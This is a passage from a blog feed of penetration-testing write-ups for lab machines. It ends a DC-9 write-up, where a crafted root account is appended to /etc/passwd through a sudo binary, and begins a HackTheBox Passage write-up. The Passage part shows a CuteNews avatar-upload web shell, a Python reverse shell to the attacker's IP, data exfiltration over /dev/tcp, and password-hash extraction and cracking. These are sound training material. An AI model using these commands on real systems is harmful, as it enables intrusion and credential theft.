</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/devstuff/dist/test/test
</span></span></code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/opt/devstuff$ cat test.py 
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import sys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> len <span class="o">(</span>sys.argv<span class="o">)</span> !<span class="o">=</span> <span class="m">3</span> :
</span></span><span class="line"><span class="cl">    print <span class="o">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    sys.exit <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">else</span> :
</span></span><span class="line"><span class="cl">    <span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>, <span class="s2">&#34;r&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">output</span> <span class="o">=</span> <span class="o">(</span>f.read<span class="o">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span>sys.argv<span class="o">[</span>2<span class="o">]</span>, <span class="s2">&#34;a&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    f.write<span class="o">(</span>output<span class="o">)</span>
</span></span><span class="line"><span class="cl">    f.close<span class="o">()</span>
</span></span></code></pre></div><h4 id="script-analysis">Script Analysis</h4>
<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>Since this gives arbitrary write on the system, it can be exploited in many ways, one of which is to add a new root account to <code>/etc/passwd</code>.</p>
<h4 id="exploitation">Exploitation</h4>
<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
</span></span><span class="line"><span class="cl"><span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>
</span></span></code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># From this</span>
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl"><span class="c1"># To</span>
</span></span><span class="line"><span class="cl">iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
</span></span></code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">fredf@dc-9:/tmp$ cat /etc/passwd
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
</span></span><span class="line"><span class="cl">janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
</span></span><span class="line"><span class="cl">iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</span></span></code></pre></div><h4 id="su---root">SU - root</h4>
<p>Now I can switch to my account and get a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/tmp$ su iamf
</span></span><span class="line"><span class="cl">Password: pass123
</span></span><span class="line"><span class="cl">root@dc-9:/tmp#
</span></span></code></pre></div><p>And here is the flag,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@dc-9:~# cat theflag.txt 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
</span></span><span class="line"><span class="cl">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
</span></span><span class="line"><span class="cl">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
</span></span><span class="line"><span class="cl">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
</span></span><span class="line"><span class="cl">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
</span></span><span class="line"><span class="cl">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
</span></span><span class="line"><span class="cl">                                                                             
</span></span><span class="line"><span class="cl">Congratulations - you have <span class="k">done</span> well to get to this point.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
</span></span><span class="line"><span class="cl">who have taken the <span class="nb">time</span> to <span class="nb">complete</span> the various DC challenges.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I also want to send out a big thank you to the various members of @m0tl3ycr3w .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">They are an inspirational bunch of fellows.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sure, they might smell a bit, but...just kidding.  :-<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sadly, all things must come to an end, and this will be the last ever
</span></span><span class="line"><span class="cl">challenge in the DC series.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">So long, and thanks <span class="k">for</span> all the fish.
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Passage</title>
      <link>https://fahmifj.github.io/hackthebox/passage/</link>
      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/passage/</guid>
      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
      <content:encoded><![CDATA[<p>Passage from HackTheBox hosts a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing me to gain code execution on the system via the avatar upload feature. Examining the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to a user. The user is using the same SSH key with another user. There is a unpatched package called USBCreator and it has vulnerability that allows an attacker to perform arbitrary file as root without supplying a password.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>
<p>CuteNews 2.1.2 exploitation</p>
</li>
<li>
<p>USBCreator D-bus exploitation</p>
</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li>gdbus - Preinstalled in the target machine.</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN initial-passage -v 10.10.10.206
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.206
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Passage News
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
<p><div class="img-container"><img src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  /></div>
</p>
<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
<p><div class="img-container"><img src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  /></div>
</p>
<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname <code>passage.htb</code>.</p>
<p><div class="img-container"><img src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  /></div>
</p>
<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  /></div>
</p>
<p>I can register as normal user.</p>
<p><div class="img-container"><img src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ searchsploit <span class="s1">&#39;CuteNews 2.1.2&#39;</span>
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                     <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">CuteNews 2.1.2 - <span class="s1">&#39;avatar&#39;</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>       <span class="p">|</span> php/remote/46698.rb
</span></span><span class="line"><span class="cl">CuteNews 2.1.2 - Arbitrary File Deletion                           <span class="p">|</span> php/webapps/48447.txt
</span></span><span class="line"><span class="cl">CuteNews 2.1.2 - Authenticated Arbitrary File Upload               <span class="p">|</span> php/webapps/48458.txt
</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
<blockquote>
<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p>
</blockquote>
<p>I can also exploit this manually.</p>
<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</span></span></code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
<p><div class="img-container"><img src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  /></div>
</p>
<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
<img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" />
<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span class="o">=</span>python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">37062</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-paul">Shell as paul</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are two users in home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
</span></span><span class="line"><span class="cl">ls -l /home
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">17</span> nadav nadav  <span class="m">4096</span> Mar <span class="m">5</span> 09:21 nadav
</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">17</span> paul  paul   <span class="m">4096</span> Mar <span class="m">5</span> 08:32 paul
</span></span></code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
<p><div class="img-container"><img src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  /></div>
</p>
<blockquote>
<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
</blockquote>
<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</span></span></code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; cdata.users
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">55022</span>
</span></span></code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:16:<span class="s2">&#34;paul@passage.htb&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;paul-coles&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:1598829833<span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;ahaha@gmail.com&#34;</span><span class="p">;</span>s:8:<span class="s2">&#34;ivanpogi&#34;</span><span class="p">;</span><span class="o">}}</span>a:2:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;egre55@test.com&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>a:11:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;1599412470&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:3:<span class="s2">&#34;acl&#34;</span><span class="p">;</span>s:1:<span class="s2">&#34;4&#34;</span><span class="p">;</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>s:13:<span class="s2">&#34;debo@debo.com&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;nick&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;pass&#34;</span><span class="p">;</span>s:64:<span class="s2">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;more&#34;</span><span class="p">;</span>s:60:<span class="s2">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;avatar&#34;</span><span class="p">;</span>s:20:<span class="s2">&#34;avatar_debo_bash.php&#34;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>And that was a mess.</p>
<p>Among these outputs, there is one that interesting.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...[SNIP]...&#34;pass&#34;;s:64:&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;...[SNIP]...
</span></span></code></pre></div><p><code>hash-identifier</code> identifies it as SHA-256.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
</span></span><span class="line"><span class="cl">   <span class="c1">#########################################################################</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#     __  __                     __           ______    _____           #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#                                                             By Zion3R #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#                                                    www.Blackploit.com #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#                                                   Root@Blackploit.com #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#########################################################################</span>
</span></span><span class="line"><span class="cl">--------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Possible Hashs:
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SHA-256
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Haval-256
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  /></div>
</p>
<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> grep -o -E -e <span class="s2">&#34;[0-9a-f]{64}&#34;</span>
</span></span><span class="line"><span class="cl">b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
</span></span><span class="line"><span class="cl">7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
</span></span><span class="line"><span class="cl">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
</span></span><span class="line"><span class="cl">231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
</span></span><span class="line"><span class="cl">41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
</span></span><span class="line"><span class="cl">4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
</span></span><span class="line"><span class="cl">03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
</span></span><span class="line"><span class="cl">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
</span></span><span class="line"><span class="cl">f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
</span></span><span class="line"><span class="cl">84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
</span></span><span class="line"><span class="cl">4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
</span></span><span class="line"><span class="cl">e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
</span></span><span class="line"><span class="cl">59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</span></span></code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
<p><code>hashcat</code> recovered five passwords.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
